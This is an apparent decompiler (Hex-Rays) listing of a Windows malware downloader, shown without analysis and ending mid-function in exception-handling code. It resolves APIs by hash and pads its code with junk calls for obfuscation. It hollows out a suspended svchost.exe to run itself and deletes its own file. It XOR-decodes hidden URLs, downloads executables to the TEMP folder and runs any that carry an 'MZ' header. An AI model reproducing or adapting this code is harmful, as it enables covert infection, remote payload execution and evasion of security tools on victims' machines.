/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __stdcall sub_401000(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14);
void __noreturn sub_40100B(); // weak
int start();
int sub_4018D9();
int __stdcall sub_401A72(LPCSTR lpString); // idb
int __stdcall sub_401D92(int a1, int a2);
int __cdecl sub_401FA8(int a1, int a2, int a3);
void __cdecl sub_4020F0(void *a1);
int __cdecl sub_402120(int a1, int a2, int a3, _DWORD *a4);
// int __usercall sub_402150@<eax>(int a1@<ebp>, int a2, unsigned int a3);
// int __userpurge sub_402219@<eax>(int result@<eax>, int a2@<ebp>, int a3);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
// LPSTR __stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpString2);
// LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2);
// BOOL __stdcall FreeConsole();
// LPSTR __stdcall GetCommandLineA();
// void __stdcall Sleep(DWORD dwMilliseconds);
// BOOL __stdcall DeleteFileA(LPCSTR lpFileName);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// DWORD __stdcall GetFileType(HANDLE hFile);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// int __stdcall lstrlenA(LPCSTR lpString);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall SetFileSecurityA(LPCSTR lpFileName, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR pSecurityDescriptor);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_40210C; // weak
const CHAR aIi[] = "ï\x00î\x00æ"; // idb
LPCSTR lpString2 = &unk_40342B; // idb
LPCSTR off_404004 = &unk_403429; // idb
LPCSTR off_40400C = &unk_4033E0; // idb
char byte_404010[8] = { '-', 'p', ']', 'ä', '‹', 'ã', '€', '“' }; // idb
char *off_404018[2] = { "öž", "TEMP" }; // weak
_UNKNOWN off_40401C; // weak
LPCSTR off_404028 = "ost."; // idb
LPCSTR off_40402C = "dll"; // idb
LPCSTR off_404038 = "in"; // idb
LPCSTR lpLibFileName = "kernel32.dll"; // idb
LPCSTR off_40404C = "svch"; // idb
LPCSTR off_404050 = "exe "; // idb
void *off_404054 = &unk_403063; // weak
_DWORD off_404058 = 4206679; // idb
_UNKNOWN off_404060; // weak
_DWORD dword_404064[4] = { 429065504, 0, 0, 0 }; // idb
int (__stdcall *dword_40425C)(_DWORD) = NULL; // weak
CHAR String[1024] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb
int (__stdcall *dword_404660)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_404664)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_404668)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_40466C)(_DWORD, _DWORD); // weak
int (__stdcall *dword_404670)(_DWORD, _DWORD); // weak
int (__stdcall *dword_404674)(_DWORD); // weak
int (__stdcall *dword_404678)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_40467C)(_DWORD); // weak
CHAR String2[260]; // idb
CHAR FileName[260]; // idb
int dword_404888; // weak
int dword_4048B4; // weak
__int16 word_4048B8; // weak
_DWORD dword_4048CC; // idb
_UNKNOWN dword_4048D0; // weak
int (__stdcall *dword_4048DC)(_DWORD, _DWORD); // weak
int (__stdcall *dword_4048E0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_4048E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_4048E8)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_4048EC)(_DWORD); // weak
int (__stdcall *dword_4048F0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int dword_4048F4; // weak
int dword_4049AC; // weak


//----- (00401000) --------------------------------------------------------
int __stdcall sub_401000(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14)
{
  return 0;
}

//----- (0040100B) --------------------------------------------------------
void __noreturn sub_40100B()
{
  LPSTR i; // ebx
  const CHAR *v1; // ebx
  int v2; // esi
  BOOL v3; // edi
  int v4; // ebx
  int v5; // esi
  int v6; // edi
  int v7; // ebx
  int v8; // esi
  int v9; // edi
  int v10; // [esp+Ch] [ebp-54h]
  int v11; // [esp+10h] [ebp-50h]
  int v12; // [esp+14h] [ebp-4Ch]
  int v13; // [esp+18h] [ebp-48h]
  int v14; // [esp+1Ch] [ebp-44h]
  int v15; // [esp+20h] [ebp-40h]
  int v16; // [esp+24h] [ebp-3Ch]
  CHAR String1[32]; // [esp+34h] [ebp-2Ch] BYREF
  int v18[3]; // [esp+54h] [ebp-Ch]

  lstrcpyA(String1, lpString2);
  lstrcatA(String1, off_404038);
  lstrcatA(String1, off_40400C);
  lstrcatA(String1, off_40402C);
  dword_40425C(String1);
  dword_40425C(off_404058);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  FreeConsole();
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  for ( i = GetCommandLineA(); *i != 32; ++i )
    ;
  v1 = i + 1;
  v2 = 0;
  v3 = 0;
  do
  {
    if ( v3 )
      break;
    sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
    Sleep(0xEFu);
    sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
    v3 = DeleteFileA(v1);
    ++v2;
  }
  while ( v2 <= 50 );
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  v18[0] = 0;
  v18[1] = 0;
  v18[2] = 0;
  v4 = 0;
  v5 = 0;
  while ( 1 )
  {
    sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
    v16 = 0;
    v14 = 0;
    v15 = 0;
    v6 = 0;
    v13 = 0;
    do
    {
      if ( v13 == 8 )
        v13 = 0;
      String[v6] = byte_404010[v13] ^ *((_BYTE *)off_404054 + v16);
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      if ( String[v6] == 44 )
      {
        sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
        String[v6] = 0;
        sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
        if ( v18[v14] )
        {
          ++v15;
        }
        else if ( sub_401A72(String) )
        {
          v18[v14] = 1;
          ++v15;
        }
        ++v14;
        v6 = -1;
      }
      ++v13;
      ++v6;
      ++v16;
    }
    while ( v16 < 88 );
    if ( v15 == 3 )
      v4 = 1;
    ++v5;
    if ( !v4 )
      Sleep(0x44EC8u);
    if ( v5 >= 3 || v4 )
    {
      if ( !v4 )
      {
        v7 = 0;
        v8 = 0;
        do
        {
          v12 = 0;
          v10 = 0;
          v11 = 0;
          v9 = 0;
          do
          {
            String[v9] = off_404018[0][v12 + 1] ^ off_404018[0][v12];
            sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
            if ( String[v9] == 44 )
            {
              sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
              String[v9] = 0;
              if ( v18[v10] )
              {
                ++v11;
              }
              else if ( sub_401A72(String) )
              {
                v18[v10] = 1;
                ++v11;
              }
              ++v10;
              v9 = -1;
            }
            ++v9;
            v12 += 3;
          }
          while ( v12 < 264 );
          if ( v11 == 3 )
            v7 = 1;
          ++v8;
          if ( !v7 )
            Sleep(0x34720u);
        }
        while ( v8 < 3 && !v7 );
      }
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      ExitProcess(0);
    }
  }
}
// 40100B: using guessed type void __noreturn sub_40100B();
// 404018: using guessed type char *off_404018[2];
// 404054: using guessed type void *off_404054;
// 404058: using guessed type char *off_404058;
// 40425C: using guessed type int (__stdcall *dword_40425C)(_DWORD);

//----- (004013BB) --------------------------------------------------------
int start()
{
  HMODULE v0; // ebx
  int v1; // ebx
  int v2; // ebx
  CHAR String1[32]; // [esp+4h] [ebp-20h] BYREF

  v0 = LoadLibraryA(lpLibFileName);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  CloseHandle((HANDLE)0xF);
  dword_404660 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401D92((int)v0, 653265351);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  GetFileType((HANDLE)0x5E);
  GetModuleHandleA(0);
  dword_404664 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401D92((int)v0, -92390490);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404668 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401D92((int)v0, -1500454923);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_40466C = (int (__stdcall *)(_DWORD, _DWORD))sub_401D92((int)v0, -891453201);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404670 = (int (__stdcall *)(_DWORD, _DWORD))sub_401D92((int)v0, -891442961);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404674 = (int (__stdcall *)(_DWORD))sub_401D92((int)v0, -1807139780);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404678 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_401D92((int)v0, 1203605967);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_40467C = (int (__stdcall *)(_DWORD))sub_401D92((int)v0, 2052040734);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_40425C = (int (__stdcall *)(_DWORD))sub_401D92((int)v0, 661455649);
  GetModuleFileNameA(0, String2, 0x104u);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  lstrcpyA(FileName, off_40404C);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  lstrcatA(FileName, off_404028);
  lstrcatA(FileName, off_404050);
  lstrcatA(FileName, String2);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404888 = 68;
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_4048B4 = 1;
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  word_4048B8 = 2;
  dword_404660(0, FileName, 0, 0, 0, 4, 0, 0, &dword_404888, &dword_4048CC);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  lstrcpyA(String1, lpString2);
  lstrcatA(String1, off_404038);
  lstrcatA(String1, off_40400C);
  lstrcatA(String1, off_40402C);
  v1 = dword_40425C(String1);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_4048DC = (int (__stdcall *)(_DWORD, _DWORD))sub_401D92(v1, -1252321733);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_4048E0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401D92(v1, -392642864);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_4048E4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401D92(v1, -658645594);
  dword_4048E8 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_401D92(v1, 2061584802);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_4048EC = (int (__stdcall *)(_DWORD))sub_401D92(v1, 1797561328);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  v2 = dword_40425C(off_404058);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_4048F0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401D92(v2, -1211479138);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  sub_4018D9();
  dword_40467C(0);
  return 0;
}
// 40425C: using guessed type int (__stdcall *dword_40425C)(_DWORD);
// 404660: using guessed type int (__stdcall *dword_404660)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404664: using guessed type int (__stdcall *dword_404664)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404668: using guessed type int (__stdcall *dword_404668)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40466C: using guessed type int (__stdcall *dword_40466C)(_DWORD, _DWORD);
// 404670: using guessed type int (__stdcall *dword_404670)(_DWORD, _DWORD);
// 404674: using guessed type int (__stdcall *dword_404674)(_DWORD);
// 404678: using guessed type int (__stdcall *dword_404678)(_DWORD, _DWORD, _DWORD);
// 40467C: using guessed type int (__stdcall *dword_40467C)(_DWORD);
// 404888: using guessed type int dword_404888;
// 4048B4: using guessed type int dword_4048B4;
// 4048B8: using guessed type __int16 word_4048B8;
// 4048DC: using guessed type int (__stdcall *dword_4048DC)(_DWORD, _DWORD);
// 4048E0: using guessed type int (__stdcall *dword_4048E0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4048E4: using guessed type int (__stdcall *dword_4048E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4048E8: using guessed type int (__stdcall *dword_4048E8)(_DWORD, _DWORD, _DWORD, _DWORD);
// 4048EC: using guessed type int (__stdcall *dword_4048EC)(_DWORD);
// 4048F0: using guessed type int (__stdcall *dword_4048F0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004018D9) --------------------------------------------------------
int sub_4018D9()
{
  HMODULE v0; // ebx
  char *v1; // esi
  int v2; // edi
  char v4[4]; // [esp+Ch] [ebp-4h] BYREF

  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  v0 = GetModuleHandleA(0);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  v1 = (char *)v0 + *((_DWORD *)v0 + 15);
  v2 = dword_404664(dword_4048CC, v0, *((_DWORD *)v1 + 20), 12288, 64);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404668(dword_4048CC, v2, v0, *((_DWORD *)v1 + 20), v4);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_4048F4 = 65543;
  dword_40466C(dword_4048D0, &dword_4048F4);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_4049AC = (int)sub_40100B;
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404670(dword_4048D0, &dword_4048F4);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  return dword_404674(dword_4048D0);
}
// 40100B: using guessed type void __noreturn sub_40100B();
// 404664: using guessed type int (__stdcall *dword_404664)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404668: using guessed type int (__stdcall *dword_404668)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40466C: using guessed type int (__stdcall *dword_40466C)(_DWORD, _DWORD);
// 404670: using guessed type int (__stdcall *dword_404670)(_DWORD, _DWORD);
// 404674: using guessed type int (__stdcall *dword_404674)(_DWORD);
// 4048CC: using guessed type int dword_4048CC;
// 4048D0: using guessed type int dword_4048D0;
// 4048F4: using guessed type int dword_4048F4;
// 4049AC: using guessed type int dword_4049AC;

//----- (00401A72) --------------------------------------------------------
int __stdcall sub_401A72(LPCSTR lpString)
{
  int v1; // esi
  int v2; // edi
  HANDLE v3; // ebx
  int v5; // [esp+Ch] [ebp-420h]
  int v6; // [esp+10h] [ebp-41Ch]
  int i; // [esp+14h] [ebp-418h]
  int v8; // [esp+18h] [ebp-414h]
  const CHAR *lpString2; // [esp+1Ch] [ebp-410h]
  char Buffer[1024]; // [esp+20h] [ebp-40Ch] BYREF
  DWORD NumberOfBytesWritten; // [esp+420h] [ebp-Ch] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+424h] [ebp-8h] BYREF
  int v13; // [esp+428h] [ebp-4h] BYREF

  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  v13 = 7;
  v1 = 0;
  if ( dword_4048DC(&v13, 0) )
  {
    v8 = dword_4048E0(0, 0, 0, 0, 0);
    sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
    v2 = dword_4048E4(v8, lpString, 0, 0, 0x80000000, 0);
    v1 = 0;
    if ( v2 )
    {
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      for ( i = lstrlenA(lpString); i > 0; --i )
      {
        sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
        if ( lpString[i] == 47 )
        {
          lpString2 = &lpString[i + 1];
          break;
        }
      }
      dword_404678(off_40401C, FileName, 260);
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      lstrcatA(FileName, off_404004);
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      lstrcatA(FileName, lpString2);
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      v3 = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0, 0);
      v6 = 0;
      v5 = 0;
      do
      {
        dword_4048E8(v2, Buffer, 1024, &nNumberOfBytesToWrite);
        if ( !v5 )
        {
          v5 = 1;
          if ( Buffer[0] == 77 )
          {
            v5 = 1;
            if ( Buffer[1] == 90 )
            {
              v6 = 1;
              v5 = 1;
            }
          }
        }
        WriteFile(v3, Buffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
        sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      }
      while ( nNumberOfBytesToWrite );
      CloseHandle(v3);
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      Sleep(0x10Du);
      v1 = 0;
      if ( v6 )
      {
        dword_4048F0(0, off_404060, FileName, 0, 0, 8);
        v1 = 1;
      }
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
    }
    dword_4048EC(v2);
    dword_4048EC(v8);
  }
  return v1;
}
// 401C0C: variable 'lpString2' is possibly undefined
// 40401C: using guessed type char *off_40401C;
// 404060: using guessed type char *off_404060;
// 404678: using guessed type int (__stdcall *dword_404678)(_DWORD, _DWORD, _DWORD);
// 4048DC: using guessed type int (__stdcall *dword_4048DC)(_DWORD, _DWORD);
// 4048E0: using guessed type int (__stdcall *dword_4048E0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4048E4: using guessed type int (__stdcall *dword_4048E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4048E8: using guessed type int (__stdcall *dword_4048E8)(_DWORD, _DWORD, _DWORD, _DWORD);
// 4048EC: using guessed type int (__stdcall *dword_4048EC)(_DWORD);
// 4048F0: using guessed type int (__stdcall *dword_4048F0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401D92) --------------------------------------------------------
int __stdcall sub_401D92(int a1, int a2)
{
  int v2; // ebx
  int v3; // ebx
  int v4; // esi
  int i; // edi
  int j; // [esp+Ch] [ebp-4Ch]
  int v8; // [esp+10h] [ebp-48h]
  unsigned int v9; // [esp+14h] [ebp-44h]
  int v10; // [esp+18h] [ebp-40h]
  _DWORD *v11; // [esp+1Ch] [ebp-3Ch]
  CHAR String1[32]; // [esp+20h] [ebp-38h] BYREF
  CPPEH_RECORD ms_exc; // [esp+40h] [ebp-18h]

  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  v2 = a1 + *(_DWORD *)(a1 + 60);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  v11 = (_DWORD *)(a1 + *(_DWORD *)(v2 + 120));
  v10 = a1 + v11[9];
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  lstrcpyA(String1, &aIi[4]);
  lstrcpyA(String1, &aIi[2]);
  if ( SetFileSecurityA(0, 0, 0) )
    a2 += 909668;
  lstrcpyA(String1, aIi);
  ms_exc.registration.TryLevel = 0;
  if ( !SetFileSecurityA((LPCSTR)0x852, 0, 0) )
    a2 += 118653;
  ms_exc.registration.TryLevel = -1;
  v3 = a1 + v11[8];
  v4 = a1 + v11[7];
  for ( i = 0; i < v11[6]; ++i )
  {
    v9 = 0;
    v8 = a1 + *(_DWORD *)(v3 + 4 * i);
    for ( j = 0; *(_BYTE *)(j + v8); ++j )
    {
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      v9 = ((v9 >> 25) | (v9 << 7)) ^ *(char *)(j + v8) ^ 0xF0;
    }
    if ( v9 == a2 )
      return a1 + *(_DWORD *)(v4 + 4 * *(unsigned __int16 *)(v10 + 2 * i));
  }
  return 0;
}

//----- (00401FA8) --------------------------------------------------------
int __cdecl sub_401FA8(int a1, int a2, int a3)
{
  int *v3; // ebp
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // edi
  int (__fastcall *v7)(_DWORD, _DWORD); // eax
  int v8; // eax
  int v9; // edi
  int v10; // ecx
  _DWORD v12[2]; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v3 = &savedregs;
  v4 = a2;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    sub_402150(a2 + 16, a2, 0xFFFFFFFF);
  }
  else
  {
    v12[0] = a1;
    v12[1] = a3;
    *(_DWORD *)(a2 - 4) = v12;
    v5 = *(_DWORD *)(a2 + 12);
    v6 = *(_DWORD *)(a2 + 8);
    while ( v5 != -1 )
    {
      v7 = *(int (__fastcall **)(_DWORD, _DWORD))(v6 + 12 * v5 + 4);
      if ( v7 )
      {
        v8 = v7(0, 0);
        v4 = v3[3];
        if ( v8 )
        {
          if ( v8 < 0 )
            return 0;
          v9 = *(_DWORD *)(v4 + 8);
          sub_4020F0((void *)v3[3]);
          v3 = (int *)(v4 + 16);
          sub_402150(v4 + 16, v4, v5);
          sub_402219(*(_DWORD *)(v9 + 12 * v5 + 8), v4 + 16, 1);
